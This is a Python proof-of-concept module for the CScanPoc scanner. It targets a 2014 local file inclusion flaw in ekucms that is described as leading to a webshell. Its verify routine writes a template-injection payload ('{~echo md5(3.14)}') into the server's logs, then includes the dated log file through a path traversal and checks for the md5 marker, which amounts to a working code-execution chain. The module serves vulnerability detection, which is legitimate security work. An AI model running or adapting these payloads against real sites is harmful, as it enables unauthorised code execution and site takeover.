# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'ekucms_0001' # 平台漏洞编号，留空
    name = '易酷cms本地包含导致getwebshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2014-05-22'  # 漏洞公布时间
    desc = '''
        通过本地包含直接getwebshell，直接控制整个网站权限。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'ekucms'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd6521ee5-843c-4346-b5c6-dae8aeedba53'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer http://www.wooyun.org/bugs/wooyun-2010-061639
            payload = '/index.php?s=my/show/id/{~echo md5(3.14)}'
            #code, head, res, errcode, _ = curl.curl2(arg+payload)
            r = requests.get(self.target + payload)

            if r.status_code == 200 and 'echo' in r.content:
                s = time.strftime("%d/%m/%Y")
                payload = '/index.php?s=my/show/id/\..\\temp\logs\%s_%s_%s.log'%(s[8:],s[3:5],s[0:2])
                r = requests.get(self.target + payload)

                if r.status_code and '4beed3b9c4a886067de0e3a094246f78' in r.content:
                    #security_hole('getshell '+ arg + payload)   
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
